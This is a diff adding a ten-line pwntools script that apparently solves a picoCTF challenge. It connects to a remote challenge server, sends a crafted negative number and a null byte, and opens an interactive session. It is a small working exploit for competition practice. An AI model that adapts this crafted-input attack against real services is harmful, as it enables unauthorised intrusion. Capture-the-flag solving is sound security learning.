@@ -1,0 +1,10 @@
+from pwn import *
+#exe = ELF('link_elf')
+#context(binary=exe)
+#r = exe.process()
+#gdb.attach(r)
+#raw_input(1)
+r = remote('mercury.picoctf.net',8054)
+r.sendline(b'-5144')
+r.sendline(b'\x00')
+r.interactive()
